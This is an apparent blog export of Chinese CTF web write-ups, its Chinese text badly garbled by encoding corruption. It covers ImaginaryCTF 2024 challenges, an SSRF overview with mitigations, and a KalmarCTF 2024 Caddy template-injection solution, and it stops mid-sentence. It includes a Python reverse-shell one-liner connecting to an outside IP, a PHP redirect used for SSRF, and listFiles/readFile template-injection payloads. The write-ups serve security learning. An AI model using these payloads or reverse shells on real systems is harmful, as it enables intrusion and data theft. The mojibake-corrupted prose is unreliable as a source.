å¯ä»¥çŸ¥é“flagæ”¾ç½®åœ¨/app/publicæ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶åå‡ ä¸ªæ¯”è¾ƒå…³é”®çš„æ–‡ä»¶ default.conf server listen 80 default_server; listen [::]:80; root /app/public; location / #æ£€æµ‹urlæ˜¯å¦åœ¨/app/publicæ–‡ä»¶å¤¹ä¸‹å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨è¿”å›404 if (-f $request_filename) return 404; proxy_pass http://localhost:8000; /src/app.js const express = require(express)const path = require(path)const app = express()app.use(express.static(path.join(__dirname, ../public)))app.listen(8000) æ‰€ä»¥è¿™é“é¢˜ç›®å¾ˆæ˜æ˜¾çš„ç›®çš„å°±æ˜¯è¦ç»•è¿‡nginxçš„æ–‡ä»¶æ£€æµ‹if (-f $request_filename)ï¼Œä½†è¦åœ¨nodeçš„è¿™ä¸ªwebç¨‹åºä¸­èƒ½è¢«è¯»å– ä¸€é€šä¹±å°è¯• åŸç†åˆ†æ readme2 (249 pts) - 56 solves by maple3142 Description Try to read the flag.txt file, again! é™„ä»¶ï¼šç‚¹å‡»ä¸‹è½½é™„ä»¶ okè¿™é¢˜ä¸æ˜¯è‡ªå·±æƒ³å‡ºæ¥çš„ï¼Œä»¥åä¸€å®šå¥½å¥½çœ‹å®˜æ–¹æ–‡æ¡£ï¼ŒåŸæ–‡æŒ‡è·¯ï¼šreadme2 | siunamâ€™s Website é™„ä»¶é‡Œçš„å†…å®¹å¾ˆç®€å•ï¼Œä»dockerfileå¯ä»¥çŸ¥é“æ˜¯ä½¿ç”¨bun.jsèµ·çš„åç«¯æœåŠ¡ ä»€ä¹ˆæ˜¯bunï¼ŸBun â€” A fast all-in-one JavaScript runtime app.js const flag = process.env.FLAG || ictfthis_is_a_fake_flagBun.serve(\tasync fetch(req) const url = new URL(req.url) if (url.pathname === /) return new Response(Hello, World!) if (url.pathname.startsWith(/flag.txt)) return new Response(flag) return new Response(`404 Not Found: $url.pathname`, status: 404 )\t,\tport: 3000)Bun.serve(\tasync fetch(req) if (req.url.includes(flag)) return new Response(Nope, status: 403 ) const headerContainsFlag = [...req.headers.entries()].some(([k, v]) = k.includes(flag) || v.includes(flag)) if (headerContainsFlag) return new Response(Nope, status: 403 ) const url = new URL(req.url) if (url.href.includes(flag)) return new Response(Nope, status: 403 ) return fetch(new URL(url.pathname + url.search, http://localhost:3000/), method: req.method, headers: req.headers, body: req.body )\t,\tport: 4000 // only this port are exposed to the public) è¯»app.jså¯ä»¥çŸ¥é“åç«¯èµ·äº†ä¸¤ä¸ªæœåŠ¡ï¼Œå¯¹å¤–å¼€æ”¾çš„æ˜¯4000ç«¯å£ï¼Œå¾ˆæ˜æ˜¾æƒ³è¦æ‹¿åˆ°flagï¼Œæœ€ç»ˆéœ€è¦é€šè¿‡4000ç«¯å£ï¼Œè®¿é—®åˆ°3000ç«¯å£ï¼Œä¸”urlå¼€å¤´ä»¥flag.txtã€‚ æ€è·¯ä¸€ï¼š åˆ©ç”¨hostæœ€å¼€å§‹å°è¯•æƒ³èƒ½ä¸èƒ½åˆ©ç”¨è¯·æ±‚å¤´hostï¼Œå¹¶é€šè¿‡/..æœ€ç»ˆç»•è¿‡æ£€æµ‹ï¼Œå‘ç° ç‰¹æ€§1ï¼š è‡ªåŠ¨å¤„ç†/..ç©¿æ¢­è‡³ä¸Šä¸€çº§urlå¤„ä¼ å…¥ ä¼šå‘ç°åŒ/testæ¶ˆå¤±ï¼ŒåŸå› ä¸ºç¬¬1æ¬¡ä¼ å…¥åï¼Œurlç”±äºæœ‰..æ‰€ä»¥ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡çš„urlçš„pathnameéƒ¨åˆ†åªå‰©ä¸‹/ï¼Œå¦‚ä¸‹å›¾ ç‰¹æ€§2ï¼š urlå±æ€§æ˜¯è¯·æ±‚åŒ…host+getå‚æ•°çš„ç»“æœæœ€ç»ˆä¼ å…¥3000ç«¯å£çš„urlçš„pathnameå˜æˆäº†/test/test åŸå› ï¼šé€šè¿‡ä»£ç æœ€åä¸€æ®µå¯ä»¥å‘ç° return fetch(new URL(url.pathname + url.search, http://localhost:3000/), method: req.method, headers: req.headers, body: req.body) hostè¢«åŸæ ·ä¼ å…¥ï¼Œç”±äº const url = new URL(req.url)new URL(url.pathname + url.search, http://localhost:3000/) ä½†æ­¤æ—¶urlçš„pathnameå¤„ä»¥åŠæœ‰äº†ä¸€ä¸ª/testæ‰€ä»¥æœ€åpathnameå‡ºç°åŒ/test ç‰¹æ€§3ï¼šé€šè¿‡æ‹¼æ¥çš„urlä¼šè‡ªåŠ¨çœç•¥ \\tï¼ˆtabé”®ï¼‰å‘é€çš„è¯·æ±‚åŒ…å¦‚ä¸‹ åœ¨ä¼ å…¥åè·å¾—çš„urlä¸º å‘ç°\\tè¢«è‡ªåŠ¨å¿½ç•¥äº† ç”±äºåœ¨å¯¹äº/..çš„å¤„ç†æ˜¯åœ¨ç¨‹åºè¿è¡Œå‰ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œæ­é… åˆ†æä¸€æ³¢ ç¬¬ä¸€æ¬¡ä¼ å…¥åï¼Œurlä¸ºlocalhost:8100/flag.txt/..(\\tè¢«è‡ªåŠ¨çœç•¥)ï¼Œæ­¤æ—¶è¿˜ä¼šè‡ªåŠ¨å¤„ç†/..,æ‰€ä»¥ç¬¬ä¸€æ¬¡çš„urlä¸ºlocalhost:8100/ï¼Œhostä¸­çš„\\tä¸ä¼šè¢«è‡ªåŠ¨å¿½ç•¥ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡æ£€æµ‹çš„æ‰€æœ‰éƒ¨åˆ†éƒ½ä¸å«æœ‰flagï¼Œä¸”é€šè¿‡req.urlå‡ºçš„urlä¹Ÿä¸å«flag if (req.url.includes(flag)) return new Response(Nope, status: 403 ) const headerContainsFlag = [...req.headers.entries()].some(([k, v]) = k.includes(flag) || v.includes(flag)) if (headerContainsFlag) return new Response(Nope, status: 403 ) const url = new URL(req.url) if (url.href.includes(flag)) return new Response(Nope, status: 403 ) ä½†ç”±äº return fetch(new URL(url.pathname + url.search, http://localhost:3000/), method: req.method, headers: req.headers, body: req.body) æ­¤æ—¶hostä¼šåŸå°ä¸åŠ¨çš„ä¼ ç»™3000ç«¯å£ï¼Œæ­¤æ—¶urlå˜ä¸ºhttp://localhost:3000/flag.txt/,æ»¡è¶³è·å¾—flagçš„æ¡ä»¶ å³å¯è·å¾—flag æ€è·¯äºŒï¼š åˆ©ç”¨URL apiè¿™é‡Œå®é™…å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹å°±æ˜¯è°ƒç”¨çš„URL api(æ–‡æ¡£æŒ‡è·¯ï¼šURL - Web API | MDN (mozilla.org)),ç ´ååŸæœ¬çš„urlï¼Œå°†http://localhost:3000/ä¿®æ”¹ä¸ºè‡ªå®šä¹‰çš„ç½‘å€,å‘ç°fetch()æ˜¯ä¼šè·Ÿéšé‡å®šå‘çš„ï¼Œå†åˆ©ç”¨302é‡å®šå‘è‡³http://localhost:3000/flag.txt èµ·ä¸€ä¸ªç®€å•çš„é‡å®šå‘æœåŠ¡ ?phpheader(Location: http://localhost:3000/flag.txt)? ç”¨æ³•ä¸€ï¼šè¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„ç”¨æ³•å°±æ˜¯ new URL(//foo.com, https://example.com);// = https://foo.com/ï¼ˆè§ç›¸å¯¹ URLï¼‰ å³æˆ‘ä»¬æœ€ç»ˆåœ¨ return fetch(new URL(url.pathname + url.search, http://localhost:3000/), method: req.method, headers: req.headers, body: req.body) url.pathname è¦ä»¥//å¼€å¤´ï¼Œå°è¯•ç›´æ¥ä»¥//ä¼ å…¥ï¼Œå‘ç°æ˜¯å¯è¡Œçš„ ç”¨æ³•äºŒï¼šnew URL(http://www.example.com, https://developer.mozilla.org);// = http://www.example.com/ ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œéœ€è¦ç»•è¿‡httpçš„å›ºå®šæ ¼å¼ GET /urlpart HTTP/1.1 ä¸èƒ½å‡ºç°/ï¼Œè€Œä¸”æœåŠ¡ç«¯ä¸èƒ½æŠ¥é”™ï¼Œåœ¨discordä¸Šæ‰¾åˆ°äº†è¿™ç§æ–¹æ³• å…·ä½“åŸç†çš„è¯ï¼Œéœ€è¦çœ‹bunæ¡†æ¶å¯¹urlå‚æ•°çš„å¤„ç†æ–¹å¼ å³æœ€åçš„è¯·æ±‚åŒ…ä¸º å¯ä»¥çœ‹åˆ°urlçš„pathnameéƒ¨åˆ†å¹¶æ²¡æœ‰/å¼€å¤´ journal-dist (100 pts) - 518 solves by Eth007 Description dear diary, there is no LFI in this app é™„ä»¶ï¼šç‚¹å‡»ä¸‹è½½é™„ä»¶ æºç æ¯”è¾ƒçŸ­ if (isset($_GET[file])) $file = $_GET[file]; $filepath = ./files/ . $file; assert(strpos($file, ..) === false) or die(Invalid file!); if (file_exists($filepath)) include($filepath); else echo File not found!; èƒ½å¯¼è‡´æ¼æ´çš„å°±æ˜¯assert(strpos($file, ..) === false)ï¼Œç”±äºé‡‡ç”¨å­—ç¬¦ä¸²å‡­å€Ÿï¼Œæ‰€ä»¥assert()å‡½æ•°(å®˜æ–¹æ–‡æ¡£æŒ‡è·¯ï¼šPHP: assert - Manual)ä¸­æ‰§è¡Œçš„ä»£ç åŸºæœ¬ä¸Šæ˜¯å¯æ§çš„ root@2419de65327b:/var/www/html# php -vPHP 7.4.33 (cli) (built: Nov 15 2022 06:03:30) ( NTS )Copyright (c) The PHP GroupZend Engine v3.4.0, Copyright (c) Zend Technologies ç»è¿‡æµ‹è¯•å‘ç°ï¼Œåœ¨æ­¤ç‰ˆæœ¬ä¸­ç¡®å®è¢«phpä»£ç æ‰§è¡Œï¼Œä½†ç”±äºstrpos()æœ‰è¿”å›å€¼äº†ï¼Œæ‰€ä»¥éœ€è¦åœ¨strpos()ä¸­è¿›è¡Œæ‹¼æ¥ï¼Œæœ€åplayload P2C (100 pts) - 247 solves by FIREPONY57 Description Welcome to Python 2 Color, the worldâ€™s best color picker from python code! é™„ä»¶ï¼šç‚¹å‡»ä¸‹è½½é™„ä»¶ é‡ç‚¹å°±æ˜¯è¿™ä¸ªå‡½æ•° def xec(code): code = code.strip() indented = .join([ + line for line in code.strip().splitlines()]) file = f/tmp/uploads/code_md5(code.encode()).hexdigest().py with open(file, w) as f: f.write(def main(): ) f.write(indented) f.write( from parse import rgb_parseprint(rgb_parse(main()))) os.system(fchmod 755 file) try: res = subprocess.run([sudo, -u, user, python3, file], capture_output=True, text=True, check=True, timeout=0.1) output = res.stdout except Exception as e: output = None os.remove(file) return output ç®€å•æ¥è¯´å°±æ˜¯æ ¹æ®è¾“å…¥çš„codeï¼Œæœ€åç”Ÿæˆä¸€ä¸ªï¼Œå¦‚ä¸‹æ ¼å¼çš„pyæ–‡ä»¶ def main(): #input codefrom parse import rgb_parseprint(rgb_parse(main())) rgb_parse()å‡½æ•°å®šä¹‰ä¸­parse.py def rgb_parse(inp=): inp = str(inp) randomizer = random.randint(100, 1000) total = 0 for n in inp: n = ord(n) total += n+random.randint(1, 10) rgb = total*randomizer*random.randint(100, 1000) rgb = str(rgb%1000000000) r = int(rgb[0:3]) + 29 g = int(rgb[3:6]) + random.randint(10, 100) b = int(rgb[6:9]) + 49 r, g, b = r%256, g%256, b%256 return r, g, b æ€è·¯ä¸€ï¼š åå¼¹Shellres = subprocess.run([sudo, -u, user, python3, file], capture_output=True, text=True, check=True, timeout=0.1) æœ€å¼€å§‹çœ‹åˆ°timeout=0.1è¿˜ä»¥ä¸ºpythonä¸phpä¸€æ ·ï¼Œæ‰§è¡Œå­è¿›ç¨‹çš„æ—¶é—´ç®—ä½œæ•´ä½“æ—¶é—´ï¼Œ0.1ç§’åå¼¹å‡ºshellå¥½åƒå¹¶æ²¡æœ‰å•¥ç”¨ï¼Œå®é™…ä¸Šæ˜¯å¯ä»¥åå¼¹å‡ºshellï¼Œtimeout=0.1å¯¹åå¼¹shellå¹¶æ²¡æœ‰å½±å“ å»hacktoolsé‡Œç”Ÿæˆä¸€ä¸ªpythonçš„åå¼¹shellè¯­å¥ python3 -c import os,pty,socket;s=socket.socket();s.connect((1.1.1.1,8077));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(sh) è´´ä¸Šå» è™½ç„¶é¡µé¢ä¼šæŠ¥500é”™è¯¯ æˆåŠŸåå¼¹åˆ°shell æ€è·¯äºŒï¼š åˆ©ç”¨urllibåº“è¿™ä¸ªæ€è·¯å°±æ˜¯ç›´æ¥è¯»å–æ–‡ä»¶ï¼Œç„¶åå› ä¸ºç³»ç»Ÿå‘½ä»¤è¡Œä¸­æ²¡æœ‰curlå‘½ä»¤ä½¿ç”¨ï¼Œä¸”æ²¡æœ‰requestsåº“ï¼Œä½†å¯ä»¥ä¾é åŸç”Ÿçš„urllibåº“ï¼Œå°†flagå¤–å¸¦å‡ºæ¥ è™½ç„¶ä¹Ÿ500ï¼Œä½†æœ€ç»ˆä¹Ÿæ˜¯æ‹¿åˆ°äº†flag æ€è·¯ä¸‰ï¼š åˆ©ç”¨random.seed è¿™ç§æ˜¯å®˜æ–¹çš„WPä¸­çš„è§£æ³•ï¼Œè¿™é‡Œè®²ä¸€ä¸‹æ€è·¯ é“¾æ¥æŒ‡è·¯ï¼šhttps://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/blob/main/Web/p2c/challenge/solve.py randomåº“åœ¨è®¾ç½®seedåï¼Œrandom.randint()èŒƒå›´ç¡®å®šæ—¶ï¼Œç”Ÿæˆçš„å€¼ä¸ºå›ºå®šçš„ import randomdef main(): random.seed(1)if __name__ == __main__: main() print(random.randint(100, 1000)) PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release ä¸”å‡½æ•°ä¸­rgb_parse(inp=)çš„inpå€¼ä¸ºå¯æ§çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶å›ºå®šï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶random.seed()çš„å€¼ï¼Œæ¯ä¸ªä¸åŒå€¼é€šè¿‡rgb_parse()ï¼Œæ­¤æ—¶returnçš„å€¼ä¸å†æ˜¯å˜åŒ–çš„è€Œæ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼ å°†random.seed()çš„å€¼ä¸ºflagå­—ç¬¦çš„ä¸­çš„é€ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å˜é‡åªæœ‰flagçš„æ¯ä¸ªå­—ç¬¦ï¼Œåœ¨æœ¬åœ°æ ¹æ®returnçš„rgbç®—æ³•è·‘ä¸€è¾¹å½©è™¹è¡¨ï¼Œä¹Ÿå°±æ˜¯å®˜æ–¹é¢˜è§£ä¸­çš„ lookup = rgb_parse(i, aaa):i for i in range(256) æœ€ç»ˆæ¯ä¸ªrgbæ ¹æ®å½©è™¹è¡¨çš„æ˜ å°„å…³ç³»ï¼Œè¿˜åŸä¸ºåŸæœ¬çš„å­—ç¬¦","tags":["WriteUp"],"categories":["WriteUp"]},{"title":"æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ (SSRF)","path":"/posts/d35506b2/","content":"SSRFæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆServer Side Request Forgery, SSRFï¼‰ æ”»å‡»è€…æ„é€ å½¢æˆä»¥æœåŠ¡å™¨çš„èº«ä»½å‘é€ä¸€æ¡æ„é€ å¥½çš„è¯·æ±‚ç»™æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€‚å› ä¸ºè¯·æ±‚æ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥æœåŠ¡ç«¯èƒ½è¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿ .ilwjcygizxix{zoom: 50%;} å±å®³ å¯ä»¥å¯¹æœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘ç¯å¢ƒè¿›è¡Œç«¯å£æ‰«æã€èµ„æºè®¿é—® è®¿é—®å†…éƒ¨èµ„æº,å¦‚è¿æ¥æ•°æ®åº“ç­‰ è‹¥åœ¨äº‘æœåŠ¡å™¨å¯ä»¥åˆ©ç”¨äº‘æœåŠ¡å™¨å…ƒæ•°æ®æ”»å‡»äº‘å¹³å°å†…å…¶ä»–ç»„ä»¶æˆ–æœåŠ¡ åˆ©ç”¨Redisæœªæˆæƒè®¿é—®getshell åœºæ™¯ XXEæ¼æ´ç‚¹ å›¾ç‰‡åŠ è½½ä¸‹è½½ï¼šé€šè¿‡URLåŠ è½½ç½‘ç»œå›¾ç‰‡(å¤´åƒä¸Šä¼ ç­‰) è½¬ç æœåŠ¡ï¼šé€‚é…æ‰‹æœºå±å¹•å¤§å°å¹¶é€šè¿‡URLåœ°å€è¿›è¡Œå›¾ç‰‡è½¬ç  åˆ†äº«åŠŸèƒ½ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹ï¼Œé€šè¿‡URLè·å–ç›®æ ‡é¡µæ ‡é¢˜ã€é¡µé¢ã€æˆªå›¾ç­‰å†…å®¹ ç¼–è¾‘å™¨è¿›è¡Œè¿œç¨‹å›¾ç‰‡æŠ“å– å¦‚: ueditor(ueditorçš„è¿œç¨‹å›¾ç‰‡æŠ“å–çš„åœ°å€ä¸€èˆ¬åœ¨/ueditor/editor_config.jsä¸­çš„catcherUrlå‚æ•°ä¸­) â€‹ åˆ©ç”¨è®¿é—®å†…ç½‘æœåŠ¡ä¼ªåè®®åˆ©ç”¨Redisåˆ©ç”¨äº‘ä¸»æœºå·¥å…·Bypassæ›´æ”¹IPåœ°å€å†™æ³•è§£æåˆ°å†…ç½‘çš„åŸŸååˆ©ç”¨HTTPçŠ¶æ€ç è·³è½¬åè®®æ›¿ä»£åˆ©ç”¨åŸŸåç‰¹æ®Šå­—ç¬¦æ ‡å‡†åŒ–å¤„ç†åˆ©ç”¨IPv6DNS Rebinding(DNSé‡ç»‘å®š)Fix çœ‹åˆ°å¾ˆå¤šé¢è¯•å–œæ¬¢é—®è¿™ä¸ªï¼Œå°±é¡ºæ‰‹å†™ä¸€ä¸‹ è®¾ç½®å†…ç½‘IPçš„é»‘åå•ï¼Œå¯¹äºåœ¨é»‘åå•å†…çš„IPï¼Œç¦æ­¢è®¿é—® ç»Ÿä¸€ IP åœ°å€æ ¼å¼ è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¹URLè§„èŒƒåŒ–å¤„ç† ç¦æ­¢302è·³è½¬ï¼Œè®¾ç½®ä¸è·Ÿéšè·³è½¬ å¯¹äºåŸŸåæ¥è¯´ï¼Œåº”å…ˆé€šè¿‡DNSè§£æIPï¼Œåˆ¤æ–­IPæ˜¯å¦ä¸ºå†…ç½‘é»‘åå•ä¸­ æ£€æµ‹åè®®ï¼Œè®¾ç½®åè®®ç™½åå•ï¼Œå¯ä»¥é˜²æ­¢file://,gopher://,ftp:// ç­‰åè®®å¼•èµ·çš„é—®é¢˜ã€‚ å¯¹DNS Rebinding(DNSé‡ç»‘å®š)ï¼Œè€ƒè™‘ä½¿ç”¨DNSç¼“å­˜æˆ–è€…Hostç™½åå•","tags":["CTF-Web","Web-SSRF"],"categories":["web"]},{"title":"2024KalmarCTF-WEBå¤ç›˜","path":"/posts/fbcd83ad/","content":"å‰è¨€ï¼š é¶åœºé“¾æ¥ï¼šhttps://kalmarc.tf/challenges éš¾åº¦å¤ªå¤§äº†æ ¹æœ¬å†™ä¸å‡ºæ¥å‚è€ƒå¤§ä½¬çš„é¢˜è§£æœ€åå¤ç›˜å‡ºæ¥çš„ åŸæ–‡é“¾æ¥ï¼šhttps://ireland.re/posts/KalmarCTF_2024/ å¤ç›˜é¢˜è§£Ez â›³ v2é¢˜ç›®æè¿° Caddy webserver is AWESOME, using a neat and compact syntax you can do a lot of powerful things, e.g. wanna know if your browser supports HTTP3? Or TLS1.3? etc Caddy webæœåŠ¡å™¨éå¸¸æ£’ï¼Œä½¿ç”¨ç®€æ´ç´§å‡‘çš„è¯­æ³•å¯ä»¥åšå¾ˆå¤šå¼ºå¤§çš„äº‹æƒ…ï¼Œä¾‹å¦‚ï¼Œæƒ³çŸ¥é“ä½ çš„æµè§ˆå™¨æ˜¯å¦æ”¯æŒHTTP3ï¼Ÿæˆ–è€…TLS1.3ï¼Ÿç­‰ç­‰ã€‚ Flag is located at GET $(head -c 18 devurandom | base64) go fetch it. Flag ä½äºGET $(head -c 18 devurandom | base64)ï¼Œå»è·å–å®ƒå§ã€‚ é™„ä»¶ï¼šç‚¹å‡»ä¸‹è½½é™„ä»¶ è§£é¢˜æ€è·¯ä¸‹è½½å®Œæ‰“å¼€é™„ä»¶åŒ…å‘ç°åªæœ‰å››ä¸ªæ–‡ä»¶ï¼ŒCaddyfileã€docker-compose.ymlè¿™ä¸¤ä¸ªä¸­æœ‰æ¯”è¾ƒæœ‰ç”¨çš„ä¿¡æ¯ docker-compose.ymlä¸­çš„å…³é”®ä¿¡æ¯ caddy: image: caddy:2.7.6-alpine volumes: - ./Caddyfile:/etc/caddy/Caddyfile:ro - ./flag:/wpqdDNHnYu8MZeclmpCr9Q:ro # FILE WILL BE RENAMED TO SOMETHING SIMILAR RANDOM ON PROD # æ–‡ä»¶å°†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¢«é‡æ–°å‘½åä¸ºç±»ä¼¼çš„éšæœºåç§° Caddyfileä¸­ä¸ºå¯¹Caddyçš„é…ç½®æ–‡ä»¶ (sec_headers) root * / header Content-Security-Policy default-src none; frame-ancestors none; base-uri none; Strict-Transport-Security max-age=31536000 X-XSS-Protection 0 X-Content-Type-Options nosniff X-Frame-Options DENY Referrer-Policy no-referrer (html_reply) import sec_headers header Content-Type text/html templates respond !DOCTYPE htmlmeta charset=utf-8titlehttp.request.host/titlebodyargs[0]/body(json_reply) templates # By default placeholders are not replaced for json mime application/json header Content-Type application/json respond args[0](http_reply) tls internal alpn args[0] map args[0] proto_name http/1.1 HTTP/1.1 h2 HTTP/2.0 h3 HTTP/3.0 @correctALPN `http.request.proto == proto_name` respond @correctALPN You are connected with http.request.proto (tls_version, tls_cipher). import html_reply You are connected with http.request.proto instead of proto_name (tls_version, tls_cipher). !-- Debug: http.request.uuid--(tls_reply) tls internal protocols args[0] args[1] header Access-Control-Allow-Origin * import json_reply tls_version:tls_version,alpn:http.request.tls.proto,sni:http.request.tls.server_name,cipher_suite:http.request.tls.cipher_suitemtls.caddy.chal-kalmarc.tf tls internal client_auth mode require templates import html_reply `You are connected with client-cert http.request.tls.client.subject`tls.caddy.chal-kalmarc.tf import tls_reply tls1.2 tls1.3tls12.caddy.chal-kalmarc.tf import tls_reply tls1.2 tls1.2tls13.caddy.chal-kalmarc.tf import tls_reply tls1.3 tls1.3ua.caddy.chal-kalmarc.tf tls internal templates import html_reply `User-Agent: .Req.Header.Get User-Agent`http.caddy.chal-kalmarc.tf tls internal templates import html_reply You are connected with http.request.proto (tls_version, tls_cipher).http1.caddy.chal-kalmarc.tf import http_reply http/1.1http2.caddy.chal-kalmarc.tf import http_reply h2http3.caddy.chal-kalmarc.tf import http_reply h3caddy.chal-kalmarc.tf tls internal import html_reply `Hello! Wanna know you if your browser supports a href=https://http1.caddy.chal-kalmarc.tf/http/1.1/a? a href=https://http2.caddy.chal-kalmarc.tf/http/2/a? Or fancy for some a href=https://http3.caddy.chal-kalmarc.tf/http/3/a?! Check your preference a href=https://http.caddy.chal-kalmarc.tf/here/a.br/We also allow you to check a href=https://tls12.caddy.chal-kalmarc.tf/TLS/1.2/a, a href=https://tls13.caddy.chal-kalmarc.tf/TLS/1.3/a, a href=https://tls.caddy.chal-kalmarc.tf/TLS preference/a, supports a href=https://mtls.caddy.chal-kalmarc.tf/mTLS/a? Checkout your a href=https://ua.caddy.chal-kalmarc.tf/User-Agent/a!!-- At some point we might even implement a a href=https://flag.caddy.chal-kalmarc.tf/flag/a endpoint! --` å¯¹äºæ²¡ç”¨æ¥è§¦è¿‡çš„Caddyçš„æˆ‘åªèƒ½å»å®˜æ–¹æ–‡æ¡£çœ‹çœ‹å…¶ä¸­çš„é…ç½®æ–‡ä»¶æ‰€ä»£è¡¨çš„å«ä¹‰ æŸ¥äº†ä¸‹å‘ç°è¿˜æœ‰ä¸­æ–‡æ–‡æ¡£å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ é“¾æ¥ï¼šCaddy v2ä¸­æ–‡æ–‡æ¡£ (dengxiaolong.com) ä¸æ‡‚çš„å°±åŠæŸ¥åŠçŒœï¼Œé—®é—®ç‹—å±é€šï¼Œç„¶åæœ‰ä¸ªåˆæ­¥çš„ç†è§£: Caddyä¸­å­˜åœ¨ä¸€ä¸ªæ¦‚å¿µï¼šç‰‡æ®µ (æŒ‡ä»¤å)\tå…·ä½“çš„æŒ‡ä»¤å†…å®¹ ä¾‹å¦‚ï¼š (html_reply) import sec_headers header Content-Type text/html templates respond !DOCTYPE htmlmeta charset=utf-8titlehttp.request.host/titlebodyargs[0]/body ç‰‡æ®µç±»ä¼¼äºæˆ‘ä»¬ç†Ÿæ‚‰çš„æ¦‚å¿µï¼šå‡½æ•°ï¼Œå¯ä»¥åœ¨è¢«è°ƒç”¨ åœ¨ä»»ä½•ä½ éœ€è¦çš„åœ°æ–¹é‡å¤ä½¿ç”¨å®ƒï¼š import æŒ‡ä»¤å å— å—ç”±ä¸€å¯¹èŠ±æ‹¬å·å®Œæˆçš„ï¼š ... ... èŠ±æ‹¬å·å‰å†™æ‰€æœåŠ¡çš„åŸŸåï¼ŒèŠ±æ‹¬å·åå¡«å†™å¯¹åº”çš„æŒ‡ä»¤ æ­¤å¤–åœ¨ç‰‡æ®µä¸­æœ‰ä¸€ä¸ªç‰¹åˆ«çš„æŒ‡ä»¤ï¼štemplates-æ¨¡æ¿ï¼Œç±»ä¼¼äºpythonä¸­çš„Jinja2æ¨¡æ¿å¼•æ“ï¼Œè¿›è¡Œå®æ—¶æ¸²æŸ“ å¯¹åº”çš„å®˜æ–¹æ–‡æ¡£ï¼šModule http.handlers.templates - Caddy Documentation (caddyserver.com) æ ¹æ®templateså¯¹åº”çš„è¯­æ³•è§„åˆ™ï¼ˆæŒ‡ä»¤ï¼‰å°è¯•èƒ½ä¸èƒ½å’ŒPythonä¸€æ ·è¿›è¡Œæ¨¡æ¿æ³¨å…¥ ç”±äºä¿®æ”¹UAï¼ˆUser-Agentï¼‰æ¯”è¾ƒæ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©äº†ua.caddy.chal-kalmarc.tfï¼Œå°†UAä¿®æ”¹ä¸º7*7å‘ç°æœåŠ¡ç«¯è¿”å›äº†500é”™è¯¯ï¼Œå‘ç°è¿™ä¸ªæ€è·¯åº”è¯¥æ˜¯æœ‰æˆï¼Œä¿®æ”¹ä¸º.Hostå‘ç°æœ€åé¡µé¢è¿”å›äº†User-Agent: ua.caddy.chal-kalmarc.tfï¼Œå‘ç°ç¡®å®å¯ä»¥è¿›è¡Œç±»ä¼¼æ¨¡æ¿æ³¨å…¥çš„æ“ä½œï¼Œè€Œå®˜æ–¹æ–‡æ¡£ä¸­æœ‰ä¸¤ä¸ªå¯ä»¥è®©æˆ‘ä»¬è¯»åˆ°flagçš„æŒ‡ä»¤ 1.readFile Reads and returns the contents of another file, as-is. Note that the contents are NOT escaped, so you should only read trusted files.æŒ‰åŸæ ·è¯»å–å¹¶è¿”å›å¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚è¯·æ³¨æ„ï¼Œå†…å®¹ä¸ä¼šè¢«è½¬ä¹‰ï¼Œå› æ­¤æ‚¨åº”è¯¥åªè¯»å–å—ä¿¡ä»»çš„æ–‡ä»¶ã€‚ readFile path/to/file.html 2.listFiles Returns a list of the files in the given directory, which is relative to the template contextâ€™s file root.è¿”å›ç»™å®šç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨ï¼Œè¯¥åˆ—è¡¨ç›¸å¯¹äºæ¨¡æ¿ä¸Šä¸‹æ–‡çš„æ–‡ä»¶æ ¹ç›®å½•ã€‚ listFiles /mydir å› æ­¤æˆ‘ä»¬ä¿®æ”¹UAä¸ºlistFiles \"/\"è·å¾—flagçš„æ–‡ä»¶åï¼š CVGjuzCIVR99QNpJTLtBn9 ç„¶åå†ä¿®æ”¹UAä¸ºreadFile \"/CVGjuzCIVR99QNpJTLtBn9\"ï¼Œæœ€åæˆåŠŸè·å–flagï¼š kalmarY0_d4wg_I_h3rd_y0u_l1k3_templates_s0_I_put_4n_template_1n_y0ur_template_s0_y0u_c4n_readFile_wh1le_y0u_executeTemplate BadAss Server for Hypertextå¼ºæ‚çš„è¶…æ–‡æœ¬æœåŠ¡å™¨ é¢˜ç›®æè¿° I wrote my own HTTP server. I have to admit: the code is a bit cursed, but it works! So no problem, right? æˆ‘è‡ªå·±å†™äº†ä¸€ä¸ªHTTPæœåŠ¡å™¨ã€‚æˆ‘å¿…é¡»æ‰¿è®¤ï¼šä»£ç 